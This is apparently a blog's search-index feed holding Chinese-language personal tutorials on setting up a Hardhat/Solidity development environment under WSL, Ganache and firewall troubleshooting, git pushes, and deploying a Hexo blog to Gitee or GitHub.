class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs awk">const &#123; getNamedAccounts, ethers &#125; = require(<span class="hljs-string">&quot;hardhat&quot;</span>);<br><br>  <br><br>async <span class="hljs-keyword">function</span> main() &#123;<br><br>  const &#123; deployer &#125; = await getNamedAccounts();<br><br>  const fundMe = await ethers.getContract(<span class="hljs-string">&quot;Fundme&quot;</span>, deployer);<br><br>  console.log(<span class="hljs-string">&quot;Funding...&quot;</span>);<br><br>  const transactionResponse = await fundMe.Withdraw();<br><br>  await transactionResponse.wait(<span class="hljs-number">1</span>);<br><br>  console.log(<span class="hljs-string">&quot;Got it back!&quot;</span>);<br><br>&#125;<br><br>  <br><br>main()<br><br>  .then(() =&gt; process.<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>))<br><br>  .catch((error) =&gt; &#123;<br><br>    console.error(error);<br><br>    process.<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br><br>  &#125;);<br></code></pre></td></tr></table></figure><h2 id="vscode的js调试功能"><a href="#vscode的js调试功能" class="headerlink" title="vscode的js调试功能"></a>vscode的js调试功能</h2><p>在vscode的左边选择调试然后打开一个js调试终端<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308041402669.png" alt="image.png"><br>然后在调试终端中运行脚本即可</p><p>如果需要查看特定的数据可以直接打开调试控制台输入对应的变量名即可<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308041406022.png" alt="image.png"></p><h2 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h2><p>先要在github创建仓库<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308041411772.png" alt="Pasted image 20230803215437.png"></p><p>在github上创建好仓库后<br>在终端输入<br><code>git init -b main</code><br>初始化项目文件夹、<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308041411348.png" alt="Pasted image 20230803215529.png"></p><p>其中的绿色的是需要上传的，灰色的是在.gitignore中的<br>使用git status可以查看git的暂存状态</p><p><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308041412030.png" alt="Pasted image 20230803215839.png"></p><p>使用<br><code>git add .</code><br>即可进行暂存<br>暂存之后的文件就是使用git status展现的如下形式</p><p><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308041412277.png" alt="Pasted image 20230803220016.png"></p><p>接下来使用<br><code>git commit -m &#39;first commit&#39;</code><br>这次再使用gitstatus就没有东西了</p><p><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308041412315.png" alt="Pasted image 20230803220326.png"></p><p>然后使用<br><code>git remote add origin https://github.com/guhuihey/web3test.git</code><br>连接仓库并命名为origin<br>使用<br><code>git remote -v</code><br>可以查看仓库情况</p><p><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202308041413099.png" alt="Pasted image 20230803220824.png"><br>最后通过<br><code>git push origin main</code><br>上传到github既可，当然因为这一步会有一个身份验证，如果无法验证可以创建一个github token以达成目的</p><h2 id="依赖包的安装"><a href="#依赖包的安装" class="headerlink" title="依赖包的安装"></a>依赖包的安装</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">yarn add --dev <span class="hljs-variable">@nomiclabs</span>/hardhat-ethers<span class="hljs-variable">@npm</span><span class="hljs-symbol">:hardhat-deploy-ethers</span> ethers <span class="hljs-variable">@nomiclabs</span>/hardhat-etherscan <span class="hljs-variable">@nomiclabs</span>/hardhat-waffle chai ethereum-waffle hardhat hardhat-contract-sizer hardhat-deploy hardhat-gas-reporter prettier prettier-plugin-solidity solhint solidity-coverage dotenv <span class="hljs-variable">@chainlink</span>/contracts<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows wsl智能合约编程环境搭建</title>
    <link href="/2023/07/11/Windows%20wsl%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/07/11/Windows%20wsl%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="下载wsl（windows子系统）"><a href="#下载wsl（windows子系统）" class="headerlink" title="下载wsl（windows子系统）"></a>下载wsl（windows子系统）</h1><p>运行</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">wsl <span class="hljs-comment">--install</span><br></code></pre></td></tr></table></figure><p>但是似乎不能正常启动<br>会报<br><code>0x80004002</code>之类的错误<br>查了一下针对我遇到的这类错误运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br><span class="hljs-built_in">Enable-WindowsOptionalFeature</span> <span class="hljs-literal">-Online</span> <span class="hljs-literal">-FeatureName</span> Microsoft<span class="hljs-literal">-Windows-Subsystem-Linux</span><br></code></pre></td></tr></table></figure><p>即可，在后来使用的时候也遇到了无法启动的问题，似乎是因为windows更新把子系统的组件删掉了，需要<br>在任务面板中打开程序在windows服务中选择子系统相关的选项即可<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202307120858980.png"></p><h1 id="vscode编程环境搭建"><a href="#vscode编程环境搭建" class="headerlink" title="vscode编程环境搭建"></a>vscode编程环境搭建</h1><h2 id="连接wsl"><a href="#连接wsl" class="headerlink" title="连接wsl"></a>连接wsl</h2><p>可以在vscode中ctrl+shift+p创建wsl窗口<br>或者在wsl中输入code .<br>即可拥有liunx命令行版的vscode</p><h2 id="子系统虚拟环境搭建"><a href="#子系统虚拟环境搭建" class="headerlink" title="子系统虚拟环境搭建"></a>子系统虚拟环境搭建</h2><p>然后配置wsl中的nvm环境<br>首先在创建好的文件夹里执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -o- https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/nvm-sh/</span>nvm<span class="hljs-regexp">/v0.39.1/i</span>nstall.sh<br></code></pre></td></tr></table></figure><p>然后重启wsl即可查看nvm版本</p><p>然后执行</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">nvm <span class="hljs-keyword">install</span> nodejs的版本号<br></code></pre></td></tr></table></figure><p>安装js即可</p><h2 id="代码格式化工具"><a href="#代码格式化工具" class="headerlink" title="代码格式化工具"></a>代码格式化工具</h2><p>再vscode中下载solidity+hardhat（现在改名了变成了solidity一个黄色的以太坊图标）<br>它可以使代码高亮<br>然后再安装一个格式化文件prettier<br>并且配置json文件（ctrl+shift+p选择open setting json）<br>在上一条语句后面加上逗号：<br>把以下语句加入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"><br>    &quot;<span class="hljs-selector-attr">[solidity]</span>&quot;: &#123;<br><br>        &quot;editor<span class="hljs-selector-class">.defaultFormatter</span>&quot;: <span class="hljs-string">&quot;NomicFoundation.hardhat-solidity&quot;</span><br><br>    &#125;,<br>   <br>    &quot;<span class="hljs-selector-attr">[javascript]</span>&quot;: &#123;<br><br>        &quot;editor<span class="hljs-selector-class">.defaultFormatter</span>&quot;:<span class="hljs-string">&quot;esbenp.prettier-vscode&quot;</span><br><br>    &#125;,<br></code></pre></td></tr></table></figure><p>即可实现vs自动格式化<br>当然除此之外还需要打开open user setting<br>配置format on save 和default format</p><p>同样prettier也可以将solidity格式化而不一定要使用hardhat<br>可以通过<br><code>yarn add prettier prettier-plugin-solidity</code><br>安装prettier的solidity插件然后在项目文件夹中创建一个.prettierrc文件，然后输入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;<br>    <span class="hljs-regexp">/*  prettier的配置 */</span><br>    <span class="hljs-string">&quot;prettier.printWidth&quot;</span>: <span class="hljs-number">100</span>, <span class="hljs-regexp">//</span> 超过最大值换行<br>    <span class="hljs-string">&quot;prettier.tabWidth&quot;</span>: <span class="hljs-number">4</span>, <span class="hljs-regexp">//</span> 缩进字节数<br>    <span class="hljs-string">&quot;prettier.useTabs&quot;</span>: false, <span class="hljs-regexp">//</span> 缩进不使用tab，使用空格<br>    <span class="hljs-string">&quot;prettier.semi&quot;</span>: true, <span class="hljs-regexp">//</span> 句尾添加分号<br>    <span class="hljs-string">&quot;prettier.singleQuote&quot;</span>: true, <span class="hljs-regexp">//</span> 使用单引号代替双引号<br>    <span class="hljs-regexp">//</span>这里只是示例更多相关设置可以自行查询<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="包管理器"><a href="#包管理器" class="headerlink" title="包管理器"></a>包管理器</h2><p>需要安装安装yarn，运行命令corepack enable即可<br>然后获取solc<br>运行 yarn add solc或者npm类命令也可<br>yarn add <a href="mailto:&#x73;&#x6f;&#108;&#99;&#64;&#x30;&#46;&#x38;&#46;&#48;">&#x73;&#x6f;&#108;&#99;&#64;&#x30;&#46;&#x38;&#46;&#48;</a>可指定solc的版本<br>yarn global add solc即可全局安装</p><p>然后运行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">yarn solcjs <span class="hljs-attr">--bin</span> <span class="hljs-attr">--abi</span> <span class="hljs-attr">--include-path</span> node_modules/ <span class="hljs-attr">--base-path</span> . -o . simple-storage<span class="hljs-selector-class">.sol</span><br><span class="hljs-comment">//注意哈，这里的simple-storage.sol是目录下的文件名</span><br></code></pre></td></tr></table></figure><p>编译simple-storage.sol得到编译后的文件</p><p>同时可以将这个脚本加入到<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202307120919175.png"><br>即可使用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yarn compile</span> <br><br></code></pre></td></tr></table></figure><p>快速编译</p><h1 id="虚拟链上环境"><a href="#虚拟链上环境" class="headerlink" title="虚拟链上环境"></a>虚拟链上环境</h1><h2 id="ganache"><a href="#ganache" class="headerlink" title="ganache"></a>ganache</h2><p>这里选择ganache在windows上安装，当然也可以直接选择在子系统上安装<br>下面是转自github上大佬对相关问题的解决</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">**选项 <span class="hljs-number">1</span>：如果您想在 WSL 本身上安装和运行 Ganache👇**<br><br><span class="hljs-number">1</span>.  在 WSL 上安装 Ganache  <br>    `yarn <span class="hljs-keyword">add </span>ganache`<br>    <br><span class="hljs-number">2</span>.  运行甘纳许  <br>    `yarn run ganache`<br>    <br><span class="hljs-number">3</span>.  从终端屏幕底部 复制 RPC URL ( **<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8545</span> )，上面写着****RPC listening on <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8545</span>**  <br>    并将其粘贴到 ethers.<span class="hljs-keyword">js </span><span class="hljs-keyword">JsonRpcProvider( </span>) 函数参数中。<br>    <br><span class="hljs-number">4</span>.  还要在终端屏幕上滚动时复制任何**私钥，并将其粘贴到 ethers.<span class="hljs-keyword">js </span>Wallet( ) 函数参数中。**<br>    <br><span class="hljs-number">5</span>.  现在让这个终端在后台运行，因为我们希望 Ganache 服务器运行。  <br>    因此，打开一个**新终端** 并通过运行以下命令来运行 deploy.<span class="hljs-keyword">js </span>文件：  <br>    `node deploy.<span class="hljs-keyword">js`</span><br><span class="hljs-keyword"></span>    <br><br>**选项 <span class="hljs-number">2</span>：如果您想在 Windows 上运行 Ganache（如果您已经在 Windows 上安装了 Ganache）👇**<br><br><span class="hljs-number">1</span>.  转到 Ganache Windows GUI 右上角的设置（齿轮图标）。  <br>    移至**服务器**选项卡并将**主机名**更改为**WSL**（我的也适用于 VirtualBox 和 WiFi）  <br>    端口号和网络 ID 可以保持安全。<br>    <br><span class="hljs-number">2</span>.  单击UI 右上角的**保存并重新启动。**<br>    <br><span class="hljs-number">3</span>.  **现在从RPC 服务器**复制 RPC URL 并将其粘贴到 ethers.<span class="hljs-keyword">js </span><span class="hljs-keyword">JsonRpcProvider() </span>函数参数中。<br>    <br><span class="hljs-number">4</span>.  同时复制任何**私钥**并将其粘贴到 ethers.<span class="hljs-keyword">js </span>Wallet( ) 函数参数中。<br>    <br><span class="hljs-number">5</span>.  **重要步骤（防火墙设置）**：  <br>    转到Windows 上**具有高级安全性的 Windows Defender 防火墙。**  <br>    单击**Inbound Rules** &amp; Search for Ganache  <br>    右键单击​​ Ganache &amp; Go to **Properties**。**然后选中显示允许连接的**  <br>    复选框并单击应用。并关闭此防火墙窗口。<br>    <br><span class="hljs-number">6</span>.  通过在 WSL 终端窗口中运行以下命令来运行 deploy.<span class="hljs-keyword">js </span>文件：  <br>    `node deploy.<span class="hljs-keyword">js`</span><br><span class="hljs-keyword"></span>    <br><br>非常感谢所有回答并提出疑问的人。✌<br></code></pre></td></tr></table></figure><p>虽然我在这个地方卡了很久但是最后解决的时候发现并没有那么麻烦，<br>在网络选择上直接选择主机所处的网段地址即可，最大的问题还是各个包的版本问题</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;<br><br>  <span class="hljs-string">&quot;dependencies&quot;</span>: &#123;<br><br>    <span class="hljs-string">&quot;dotenv&quot;</span>: <span class="hljs-string">&quot;^16.3.1&quot;</span>,<br><br>    <span class="hljs-string">&quot;ethers&quot;</span>: <span class="hljs-string">&quot;5.6.2&quot;</span>,<br><br>    <span class="hljs-string">&quot;fs-extra&quot;</span>: <span class="hljs-string">&quot;^11.1.1&quot;</span>,<br><br>    <span class="hljs-string">&quot;ganache&quot;</span>: <span class="hljs-string">&quot;^7.9.0&quot;</span>,<br><br>    <span class="hljs-string">&quot;solc&quot;</span>: <span class="hljs-string">&quot;0.8.8&quot;</span><br><br>  &#125;,<br>  <span class="hljs-regexp">//</span>非唯一正确版本，仅供参考<br></code></pre></td></tr></table></figure><p>此外附上linux的ganache相关命令</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-a 或 –accounts：指定启动时要创建的测试账户数量。</span><br><span class="hljs-deletion">-e 或 –defaultBalanceEther：分配给每个测试账户的 ether 数量，默认值为 100。</span><br><span class="hljs-deletion">-b 或 r –blockTime：指定自动挖矿的blockTime，以秒为单位，默认值为 0，表示不进行自动挖矿。</span><br><span class="hljs-deletion">-d 或 –deterministic：基于预定的助记词（mnemonic）生成固定的测试账户地址。</span><br><span class="hljs-deletion">-n 或 –secure：默认锁定所有测试账户，有利于进行第三方交易签名。</span><br><span class="hljs-deletion">-m 或 –mnemonic：用于生成测试账户地址的助记词。</span><br><span class="hljs-deletion">-p 或 –port：设置监听端口，默认值为8545。</span><br><span class="hljs-deletion">-h 或 –hostname：设置监听主机，默认值同 NodeJS 的 server.listen()。</span><br><span class="hljs-deletion">-s 或 –seed：设置生成助记词的种子。</span><br><span class="hljs-deletion">-g 或 –gasPrice：设定 Gas 价格， 默认值为 20000000000。</span><br><span class="hljs-deletion">-l 或 –gasLimit：设定 Gas 上限，默认值为 90000。</span><br><span class="hljs-deletion">-f 或 –fork：从一个运行中的以太坊节点客户端软件的指定区块分叉，输入值应当是该节点旳 HTTP 地址和端口，例如 http://localhost:8545。可选使用 @ 标记来指定具体区块，例如：http://localhost:8545@1599200。</span><br><span class="hljs-deletion">-I 或 –networkId：指定网络 id，默认值为当前时间，或使用所分叉链的网络 id。</span><br>–db：设置保存链数据的目录，如果该路径中已经有链数据，ganache-cli 将用它初始化链而不是重新创建。<br>–debug：输出 VM 操作码，用于调试。<br>–mem：输出 ganache-cli 内存使用统计信息，这将替代标准的输出信息。<br>–noVMErrorsOnRPCResponse：不把失败的交易作为 RCP 错误发送，开启这个标志使错误报告方式兼容其他的节点客户端，例如 geth 和 Parity。<br>特殊选项：<br>–account：指定账户私钥和账户余额来创建初始测试账户，可多次设置：<br><br></code></pre></td></tr></table></figure><p>正常运行使用<br><code>yarn run ganache</code>即可</p><h2 id="子系统与主机网络之间的问题（因为网络知识不足不知道如何解决）"><a href="#子系统与主机网络之间的问题（因为网络知识不足不知道如何解决）" class="headerlink" title="子系统与主机网络之间的问题（因为网络知识不足不知道如何解决）"></a>子系统与主机网络之间的问题（因为网络知识不足不知道如何解决）</h2><p>这里使因为前面ganache的问题无法解决而发现的奇怪的地方<br>一开始以为是防火墙的问题导致子系统虚拟机无法访问主机，所以尝试性的区ping了一下，发现子系统确实ping不通。<br>结果阴差阳错之下找到了以为遇到了相同问题的大佬。<br>根据大佬的说法添加一条防火墙规则即可<br>&#96;New-NetFirewallRule -DisplayName “WSL” -Direction Inbound  -InterfaceAlias “vEthernet (WSL)”  -Action Allow<br>似乎还是不行<br>然后区看了下另一篇推荐的博客<br>发现给出上一个建议的博主使用的命令是优化过的版本，原版本是使用ip地址制定规则，但是他给出的是根据wsl的接口制定的规则；<br>原文：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt; <span class="hljs-variable">$myIp</span> = (Ubuntu1804 run <span class="hljs-string">&quot;cat /etc/resolv.conf | grep nameserver | cut -d&#x27; &#x27; -f2&quot;</span>)<br><span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt; <span class="hljs-variable">$myIp</span><br><span class="hljs-number">172.21</span>.<span class="hljs-number">0.1</span><br><span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt;  <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;WSL&quot;</span> <span class="hljs-literal">-Direction</span> Inbound  <span class="hljs-literal">-LocalAddress</span> <span class="hljs-variable">$myIp</span> <span class="hljs-literal">-Action</span> Allow<br></code></pre></td></tr></table></figure><p>理解：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$myIp</span>=<span class="hljs-string">&#x27;子系统ip&#x27;</span><br><br><span class="hljs-keyword">New</span>-NetFirewallRule -DisplayName <span class="hljs-string">&quot;WSL&quot;</span> -Direction Inbound  -LocalAddress <span class="hljs-symbol">$myIp</span> -Action Allow<br></code></pre></td></tr></table></figure><p>我本来以为那个ip是是子系统ip，但是发现只有当那个ip为空（允许所有本地ip访问）或者ip为主机ip是才能ping通。<br>即：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$myIp</span>=<span class="hljs-string">&#x27;主机ip&#x27;</span><br><br><span class="hljs-keyword">New</span>-NetFirewallRule -DisplayName <span class="hljs-string">&quot;WSL&quot;</span> -Direction Inbound  -LocalAddress <span class="hljs-symbol">$myIp</span> -Action Allow<br></code></pre></td></tr></table></figure><p>然后我去试了下那个接口的<br>还是ping不通，但是突然想起来我能用wireshark来抓包看一下通过接口的流量啊<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202307120939656.png"><br>然后又去试了下放子系统ip的<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202307120940842.png"></p><p>结果是一样的，但是并不知道是哪里出了问题，还请各位大佬指点斧正。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>blog搭建</title>
    <link href="/2023/06/30/blog%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/06/30/blog%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>参考：<a href="https://www.bilibili.com/video/BV1ts4y1f7Gu/?spm_id_from=333.788.recommend_more_video.-1&vd_source=fe3d172afc9c02fc6b38374df73e29ff">超详细！0成本搭建个人网站！！【建议收藏】_哔哩哔哩_bilibili</a><br>下载git ,nodejs,hexo<br>然后从github上下载主题到hexoblog的themes文件夹（需要解压）<br>然后修改blog文件下的config.yml文件<br>如果要修改主题的一些信息则修改themes文件下的config文件<br>每次修改后都要在git中hexo g<br>hexo s重启博客<br>然后创建gitee仓库<br>然后：git中输入：git config –global user.name “guhuihey”<br>git config –global user.email “<a href="mailto:&#49;&#x32;&#53;&#x37;&#x36;&#49;&#57;&#55;&#43;&#103;&#x75;&#x68;&#x75;&#105;&#x68;&#101;&#121;&#x40;&#117;&#115;&#101;&#114;&#46;&#110;&#x6f;&#x72;&#x65;&#x70;&#x6c;&#121;&#x2e;&#x67;&#105;&#x74;&#x65;&#101;&#46;&#x63;&#111;&#109;">&#49;&#x32;&#53;&#x37;&#x36;&#49;&#57;&#55;&#43;&#103;&#x75;&#x68;&#x75;&#105;&#x68;&#101;&#121;&#x40;&#117;&#115;&#101;&#114;&#46;&#110;&#x6f;&#x72;&#x65;&#x70;&#x6c;&#121;&#x2e;&#x67;&#105;&#x74;&#x65;&#101;&#46;&#x63;&#111;&#109;</a>“<br>然后<code>$ cat ~/.ssh/id_rsa.pub</code><br>获取生成的ssh密钥<br>然后再gitee中创建ssh密钥<br>然后<code>$ ssh -T git@gitee.com</code><br>再&#96;npm install hexo-deployer-git –save<br>最后hexo g，s，d（部署）完成（这里hexo  s时在本地查看，hexo d才是部署到服务器上）<br>但是这里将博客强制使用gitpages需要实名认证，暂时未弄好</p><p>第二次使用：<br>这里注意是要在blog文件夹中执行命令</p><p>因为gitee不能使用图床所以我干脆用github来搭<br>因为之前用gitee搭建的时候所有东西都是弄好了的<br>所以按理来说只要把地址和链接改成github的就好<br>首先修改deploy的发布地址<br>修改成如下地址<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202306301848933.png"></p><p>查看并修改关联用户信息</p><p><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202306301921572.PNG"><br>然后通过<br><code>ssh-keygen -t rsa -C “这里换上你的邮箱”</code><br>这条命令生成对应ssh公私钥<br>然后再github的设置中将新生成的公钥放入ssh连接中<br>最后通过git检验即可</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
